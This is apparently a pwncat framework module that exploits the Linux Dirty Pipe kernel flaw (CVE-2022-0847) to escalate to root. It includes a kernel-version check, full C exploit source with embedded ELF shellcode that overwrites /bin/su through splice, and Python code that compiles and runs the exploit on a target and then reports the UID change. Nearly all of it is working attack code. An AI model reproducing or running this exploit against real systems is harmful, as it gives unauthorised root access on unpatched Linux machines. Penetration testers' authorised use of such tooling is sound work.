#!/usr/bin/env python3

import rich.markup
import textwrap
import subprocess
from subprocess import CalledProcessError
from io import StringIO

from pwncat import util
from pwncat.db import Fact
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pwncat.platform import PlatformError, Path
from pwncat.channel import ChannelError

class Module(BaseModule):
    """ Exploit CVE-2022-0847 to local privesc to root via dirtypipe """

    """
    Based on original PoC at https://haxx.in/files/dirtypipez.c
    
    Usage: run dirtypipe 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def is_kernel_vulnerable(self, kernel_version):
        vulnerable = True

        try:
            kernel_ver = int((kernel_version.split("."))[0])
            major_ver = int((kernel_version.split("."))[1])
            minor_ver = int((kernel_version.split("."))[2])
        except ValueError:
            raise ModuleFailed( f"Could not parse retrieved kernel version to check for dirtypipe")
        
        if kernel_ver != 5:
            vulnerable = False
        else:
            if kernel_ver == 5 and major_ver < 8:
                vulnerable = False
            if kernel_ver == 5 and major_ver == 10 and minor_ver >= 102:
                vulnerable = False
            if kernel_ver == 5 and major_ver == 15 and minor_ver >= 25:
                vulnerable = False
            if kernel_ver == 5 and major_ver == 16 and minor_ver >= 11:
                vulnerable = False
        
        return vulnerable 

    def run(self, session: "pwncat.manager.Session"):

        yield Status( "checking to see if target is vulnerable to dirtypipe...")

        # TODO: Check why some distros aren't using kernel release nums correctly 
        #       (ie: Kali reports 5.16.0-kali5-amd64, but does have a ver of 5.16.14-1kali1)
        output = session.platform.run(
            "uname -r", capture_output=True, text=True, check=True
        )

        kernel_version = output.stdout.split("-")[0]

        if not kernel_version:
            raise ModuleFailed( f"Could not retrieve kernel version to check for dirtypipe")        

        if not self.is_kernel_vulnerable(kernel_version):
            session.log( f"It appears that this kernel ({kernel_version}) is not vulnerable to dirtypipe." )
            yield Status( "Cannot privesc to [red]root[/red]")
            return  

        session.log( f"It appears that this kernel ({kernel_version}) IS potentially vulnerable to dirtypipe!" )
        
        yield Status( "preparing to privesc to [red]root[/red] via dirtypipe")

        # Write the ELF source code
        dirtypipez_source = textwrap.dedent(
            f"""
                #define _GNU_SOURCE
                #include <unistd.h>
                #include <fcntl.h>
                #include <stdio.h>
                #include <stdlib.h>
                #include <string.h>
                #include <sys/stat.h>
                #include <sys/user.h>
                #include <stdint.h>

                #ifndef PAGE_SIZE
                #define PAGE_SIZE 4096
                #endif

                unsigned char elfcode[] = {{
                    0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
                    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
                    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
                    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
                    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
                    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
                    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
                    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
                    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
                    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
                    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
                    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
                    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
                    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
                    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
                }};
                
                static void prepare_pipe(int p[2])
                {{
                    if (pipe(p)) abort();

                    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
                    static char buffer[4096];

                    for (unsigned r = pipe_size; r > 0;) {{
                        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                        write(p[1], buffer, n);
                        r -= n;
                    }}

                    for (unsigned r = pipe_size; r > 0;) {{
                        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                        read(p[0], buffer, n);
                        r -= n;
                    }}
                }}

                int hax(char *filename, long offset, uint8_t *data, size_t len) {{
                    const int fd = open(filename, O_RDONLY); 
                    if (fd < 0) {{
                        perror("open failed");
                        return -1;
                    }}

                    struct stat st;
                    if (fstat(fd, &st)) {{
                        perror("stat failed");
                        return -1;
                    }}

                    int p[2];
                    prepare_pipe(p);

                    --offset;
                    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
                    if (nbytes < 0) {{
                        perror("splice failed");
                        return -1;
                    }}
                    if (nbytes == 0) {{
                        fprintf(stderr, "short splice\\n");
                        return -1;
                    }}

                    nbytes = write(p[1], data, len);
                    if (nbytes < 0) {{
                        perror("write failed");
                        return -1;
                    }}
                    if ((size_t)nbytes < len) {{
                        fprintf(stderr, "short write\\n");
                        return -1;
                    }}

                    close(fd);

                    return 0;
                }}

                int main(int argc, char **argv) {{
                    
                    char *path = "/bin/su";
                    uint8_t *data = elfcode;

                    int fd = open(path, O_RDONLY);
                    uint8_t *orig_bytes = malloc(sizeof(elfcode));
                    lseek(fd, 1, SEEK_SET);
                    read(fd, orig_bytes, sizeof(elfcode));
                    close(fd);

                    printf("[+] hijacking suid binary..\\n");
                    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {{
                        printf("[~] failed\\n");
                        return EXIT_FAILURE;
                    }}

                    printf("[+] dropping suid shell..\\n");
                    system(path);

                    printf("[+] restoring suid binary..\\n");
                    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {{
                        printf("[~] failed\\n");
                        return EXIT_FAILURE;
                    }}

                    printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\\n");
                    system("/tmp/sh");

                    return EXIT_SUCCESS;
                }}
                """
        ).lstrip()

        # TODO: Use this instead of hardcoding the elfcode array so it can work on other architectures.
        elf_code_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <stdlib.h>
                #include <unistd.h>

                int main(int argc, char *argv[]) {{
                    setuid(0); setgid(0);
                    seteuid(0); setegid(0);
                    char *args[] = {{ "/bin/sh", NULL }};
                    execve("/bin/sh", args, NULL );                    
                }}
            """
        ).lstrip()

        current_user = session.current_user()
        orig_id = current_user.id

        rootshell = "/tmp/" + util.random_string(8)

        # Compile dirtypipez exploit binary
        try:
            session.log("compiling dirtypipe exploit")            
            yield Status("compiling dirtypipe exploit")

            # OK, you should never static link glibc, but since pwncat has a bug
            # in its compile targeting we need to make sure the rootshell won't 
            # have glibc compat issues. Caleb is aware of the issue.
            rootshell = session.platform.compile(
                [StringIO(dirtypipez_source)],
                cflags=["-static", "-s"],
                output=rootshell
            )
        except PlatformError as exc:
            raise ModuleFailed( f"compilation failed for dirtypipez exploit: {exc}") from exc
        except ChannelError as channel_exc:
            raise ModuleFailed( f"Channel error during compilation process: {channel_exc}") from channel_exc
        except Exception as exc2:
            raise ModuleFailed( f"General exception occured while building dirtypipez exploit: {exc2}") from exc2

        try:
            session.log( "executing dirtypipez exploit")                           
            yield Status( "attempting to privesc to [red]root[/red]")
            proc = session.platform.Popen( 
                [rootshell], 
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            proc.detach()
            
            if session.platform.refresh_uid() != 0:
                session.log( "refresh_uid didn't work" )
                yield Status( "Failed to privesc to [red]root[/red]")     

        except CalledProcessError as exc:
            session.log( "Failed privesc" )
            raise ModuleFailed(f"privesc failed: {exc}") from exc
        finally:
            # Remove the rootshell
            session.platform.Path(rootshell).unlink()
        
        current_user = session.current_user()
        curr_id = current_user.id

        uid_status = f"UID : Before([blue]{orig_id}[/blue]) | After({curr_id})"
        yield Status( f"{uid_status}") 
            
        session.log( f"ran {self.name}. {uid_status}")